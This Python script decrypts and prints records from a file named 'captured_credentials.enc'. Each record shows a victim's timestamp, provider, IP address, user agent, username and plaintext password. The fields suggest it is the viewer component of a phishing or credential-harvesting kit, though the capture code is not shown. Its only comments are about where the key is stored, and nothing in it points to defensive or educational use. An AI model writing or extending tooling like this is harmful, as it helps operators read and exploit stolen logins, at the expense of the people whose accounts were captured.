"""
Utility to decrypt and display captured credentials stored in an encrypted file.

Reads the Fernet encryption key from the configuration file and uses it
to decrypt the contents of the specified credential file. Uses centralized logging
and also prints decrypted details to the console.
"""
import os
import json
import sys
import logging
import logging.config
import argparse
from cryptography.fernet import Fernet, InvalidToken

# --- Logging Setup ---
try:
    # Ensure logging_config is importable from the script's directory or parent
    script_dir = os.path.dirname(__file__)
    parent_dir = os.path.dirname(script_dir)
    if script_dir not in sys.path:
        sys.path.insert(0, script_dir)
    if parent_dir not in sys.path:
         sys.path.insert(0, parent_dir)

    from logging_config import LOGGING_CONFIG
    logging.config.dictConfig(LOGGING_CONFIG)
    # Get the credential decoder specific logger instance
    logger = logging.getLogger('credential_decoder')
    logger.info("Logging configured successfully using logging_config.")
except ImportError as ie:
    # Fallback basic config if import fails
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - [DECODER_FALLBACK] %(message)s')
    logger = logging.getLogger('credential_decoder_fallback')
    logger.error(f"Failed to import logging_config: {ie}. Using basic fallback logging.")
except Exception as e:
    # Catch other potential errors during logging setup
    logging.basicConfig(level=logging.ERROR, format='%(asctime)s - %(name)s - %(levelname)s - [DECODER_FALLBACK_ERROR] %(message)s')
    logger = logging.getLogger('credential_decoder_error')
    logger.error(f"CRITICAL ERROR setting up decoder logging: {e}", exc_info=True)
# --- ---

# --- Default Paths ---
DEFAULT_CONFIG_FILENAME = 'config.json'
DEFAULT_CRED_DIR_NAME = 'login_details'
DEFAULT_CRED_FILENAME = 'captured_credentials.enc'
# --- ---

def load_config(config_path):
    """Loads configuration from a JSON file."""
    logger.debug(f"Attempting to load config from: {config_path}")
    if not os.path.exists(config_path):
        logger.error(f"Configuration file not found: {config_path}")
        return None
    try:
        with open(config_path, 'r', encoding='utf-8') as f:
            config = json.load(f)
        logger.debug(f"Configuration loaded successfully from {config_path}.")
        return config
    except json.JSONDecodeError as e:
        logger.error(f"Error decoding configuration file {config_path}: {e}", exc_info=True)
        return None
    except Exception as e:
        logger.error(f"Unexpected error loading configuration {config_path}: {e}", exc_info=True)
        return None

def get_fernet_key(config):
    """
    Retrieves the Fernet key from the configuration.

    SECURITY WARNING: Storing the encryption key directly in a plain JSON
    configuration file is insecure. Consider using environment variables,
    a dedicated secrets management system, or prompting the user for the key.
    """
    if not config:
        logger.error("Configuration object is missing, cannot retrieve Fernet key.")
        return None
    try:
        key = config['fernet_key']
        logger.warning("SECURITY WARNING: Loading Fernet key from config file. This is insecure for production environments.")
        return key.encode('utf-8') # Fernet key must be bytes
    except KeyError:
        logger.error("Configuration file is missing the 'fernet_key'.")
        return None
    except Exception as e:
        logger.error(f"Unexpected error retrieving Fernet key: {e}", exc_info=True)
        return None

def decrypt_and_display(cred_file_path, fernet_instance):
    """
    Reads an encrypted file line by line, decrypts each line,
    logs the JSON data, and prints details to the console.

    Args:
        cred_file_path (str): Path to the encrypted credential file.
        fernet_instance (Fernet): Initialized Fernet instance for decryption.
    """
    if not os.path.exists(cred_file_path):
        logger.error(f"Credentials file not found: {cred_file_path}")
        return
    if not fernet_instance:
        logger.error("Fernet instance is not available, cannot decrypt.")
        return

    logger.info(f"Attempting to decode credentials from: {cred_file_path}\n")
    lines_processed = 0
    lines_failed = 0
    successful_decryptions = 0

    try:
        with open(cred_file_path, 'rb') as f:
            for i, line in enumerate(f):
                line_num = i + 1
                line = line.strip()
                if not line:
                    logger.debug(f"Skipping empty line {line_num}")
                    continue

                lines_processed += 1
                log_extra = {'record_number': lines_processed, 'line_number': line_num}
                try:
                    decrypted_bytes = fernet_instance.decrypt(line)
                    data = json.loads(decrypted_bytes.decode('utf-8'))
                    successful_decryptions += 1

                    # --- Print details to console ---
                    print(f"--- Record #{successful_decryptions} (Line: {line_num}) ---")
                    print(f"  Time:      {data.get('timestamp', 'N/A')}")
                    print(f"  Provider:  {data.get('provider', 'N/A')}")
                    print(f"  Client IP: {data.get('client_ip', 'N/A')}")
                    print(f"  User Agent:{data.get('user_agent', 'N/A')}")
                    print(f"  Username:  {data.get('username', 'N/A')}")
                    # WARNING: Displaying passwords, even decoded ones, is risky.
                    password = data.get('password', 'N/A')
                    print(f"  Password:  {password}") # Print actual password to console
                    print("-" * 40)
                    # --- End Print ---

                    # Log decoded data (password already removed/masked for logging)
                    log_extra.update(data)
                    if 'password' in log_extra:
                        log_extra['password_masked'] = '*' * len(log_extra['password'])
                        del log_extra['password']

                    logger.info(f"Successfully decrypted Record #{successful_decryptions}", extra=log_extra)


                except InvalidToken:
                    # Don't print anything for failed decryptions, just log
                    logger.error(f"Failed to decrypt line: Invalid token or key.", extra=log_extra, exc_info=False)
                    lines_failed += 1
                except json.JSONDecodeError:
                    logger.error(f"Failed to decode JSON after decryption.", extra=log_extra, exc_info=True)
                    lines_failed += 1
                except UnicodeDecodeError:
                     logger.error(f"Failed to decode bytes to UTF-8 after decryption.", extra=log_extra, exc_info=True)
                     lines_failed += 1
                except Exception as e:
                    logger.error(f"Failed to process line: {e}", extra=log_extra, exc_info=True)
                    lines_failed += 1

    except FileNotFoundError: # Should be caught by os.path.exists, but defensive
        logger.error(f"Credentials file disappeared during processing: {cred_file_path}")
        return
    except OSError as e:
        logger.error(f"Error reading credentials file {cred_file_path}: {e}", exc_info=True)
        return
    except Exception as e:
        logger.error(f"An unexpected error occurred during file processing: {e}", exc_info=True)
        return

    print(f"\n--- Summary ---")
    print(f"Total lines processed: {lines_processed}")
    print(f"Successfully decrypted: {successful_decryptions}")
    print(f"Decryption/Decode Failures: {lines_failed}")
    logger.info(f"Finished processing. Records processed: {lines_processed}, Successfully decrypted: {successful_decryptions}, Failures: {lines_failed}")


def main():
    """Main function to parse arguments, load key, and decrypt file."""
    logger.info("--- Starting Credential Decoder ---")
    script_dir = os.path.dirname(__file__)

    parser = argparse.ArgumentParser(description="Decrypt and display captured credentials.")
    parser.add_argument(
        '-c', '--config',
        default=os.path.join(script_dir, DEFAULT_CONFIG_FILENAME),
        help=f"Path to the configuration file (default: ./{DEFAULT_CONFIG_FILENAME})"
    )
    parser.add_argument(
        '-f', '--file',
        default=os.path.join(script_dir, DEFAULT_CRED_DIR_NAME, DEFAULT_CRED_FILENAME),
        help=f"Path to the encrypted credential file (default: ./{DEFAULT_CRED_DIR_NAME}/{DEFAULT_CRED_FILENAME})"
    )
    args = parser.parse_args()

    logger.info(f"Using config file: {args.config}")
    logger.info(f"Using credential file: {args.file}")

    config = load_config(args.config)
    if not config:
        logger.critical("Failed to load configuration. Exiting.")
        sys.exit(1)

    key = get_fernet_key(config)
    if not key:
        logger.critical("Failed to retrieve Fernet key from configuration. Exiting.")
        sys.exit(1)

    fernet_instance = None
    try:
        fernet_instance = Fernet(key)
        logger.debug("Fernet instance created successfully.")
    except (ValueError, TypeError) as e:
         logger.critical(f"Invalid Fernet key format: {e}. Key must be 32 url-safe base64-encoded bytes.", exc_info=True)
         sys.exit(1)
    except Exception as e:
        logger.critical(f"Failed to initialize Fernet instance with the provided key: {e}", exc_info=True)
        sys.exit(1)

    decrypt_and_display(args.file, fernet_instance)
    logger.info("--- Credential Decoder Finished ---")


if __name__ == '__main__':
    main()
